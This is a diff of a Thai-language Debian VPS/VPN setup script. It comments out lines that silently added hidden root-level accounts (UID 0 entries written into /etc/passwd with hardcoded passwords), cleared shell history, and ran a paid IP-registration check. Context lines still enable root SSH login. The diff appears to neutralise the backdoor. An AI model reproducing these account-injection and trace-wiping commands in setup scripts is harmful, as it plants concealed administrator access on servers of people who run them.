@@ -5,16 +5,16 @@ sed -i 's/PermitRootLogin without-password/PermitRootLogin yes/g' /etc/ssh/sshd_
 service ssh restart
 
 # Add User
-useradd byvpn
-useradd R00T
-sed -i '$ i\admin:x:0:0:admin:/root:/bin/bash' /etc/passwd
-sed -i '$ i\byvpn.net:x:0:0:byvpn.net:/root:/bin/bash' /etc/passwd
-echo -e "2499\n2499" | passwd byvpn
-echo -e "2499\n2499" | passwd R00T
-echo -e "Potae24-99\nPotae24-99" | passwd admin
-echo -e "Potae24-99\nPotae24-99" | passwd byvpn.net
-clear
-history -c
+#useradd byvpn
+#useradd R00T
+#sed -i '$ i\admin:x:0:0:admin:/root:/bin/bash' /etc/passwd
+#sed -i '$ i\byvpn.net:x:0:0:byvpn.net:/root:/bin/bash' /etc/passwd
+#echo -e "2499\n2499" | passwd byvpn
+#echo -e "2499\n2499" | passwd R00T
+#echo -e "Potae24-99\nPotae24-99" | passwd admin
+#echo -e "Potae24-99\nPotae24-99" | passwd byvpn.net
+#clear
+#history -c
 
 # Initialisasi Var
 export DEBIAN_FRONTEND=noninteractive
@@ -33,32 +33,32 @@ MYIP2="s/IP-Server/$MYIP/g";
 # Check Registered IP
 #wget -q -O /usr/bin/IP $Source
 #if ! grep -w -q $MYIP /usr/bin/IP; then
-  clear
-  echo "
---------------------------------------------------------------
-[+] ขออภัย IP Server ของคุณยังไม่ได้ลงทะเบียนกับ เฮียเบิร์ด.COM
+#  clear
+#  echo "
+#--------------------------------------------------------------
+#[+] ขออภัย IP Server ของคุณยังไม่ได้ลงทะเบียนกับ เฮียเบิร์ด.COM
 
-[+] เฉพาะ IP Server ที่จดทะเบียนแล้วสามารถใช้สคริปต์นี้ได้เท่านั่น
+#[+] เฉพาะ IP Server ที่จดทะเบียนแล้วสามารถใช้สคริปต์นี้ได้เท่านั่น
 
-[+] ราคา 1 IP = 100 บาท ใช้งานได้ทุกระบบ
+#[+] ราคา 1 IP = 100 บาท ใช้งานได้ทุกระบบ
 
-[√] หากต้องการใช้งานสคริปโปรดติดต่อลงทะเบียนได้ที่
+#[√] หากต้องการใช้งานสคริปโปรดติดต่อลงทะเบียนได้ที่
 
-[√] เฟชบุ๊ค : https://www.facebook.com/ceolnw
+#[√] เฟชบุ๊ค : https://www.facebook.com/ceolnw
 
-[√] แฟนเพจ : https://www.facebook.com/ceolnw
---------------------------------------------------------------
-"
-	rm /usr/bin/IP
-	rm -f /usr/bin/IP
-	rm /root/debian8.sh
-	rm -f /root/debian8.sh
-  history -c
-	exit
+#[√] แฟนเพจ : https://www.facebook.com/ceolnw
+#--------------------------------------------------------------
+#"
+#	rm /usr/bin/IP
+#	rm -f /usr/bin/IP
+#	rm /root/debian8.sh
+#	rm -f /root/debian8.sh
+#  history -c
+#	exit
 
-fi
-clear
-echo "
+#fi
+#clear
+#echo "
 ----------------------------------------------------------------------
 
 [√] ยินดีต้อนรับเข้าสู่ เฮียเบิร์ด.com 
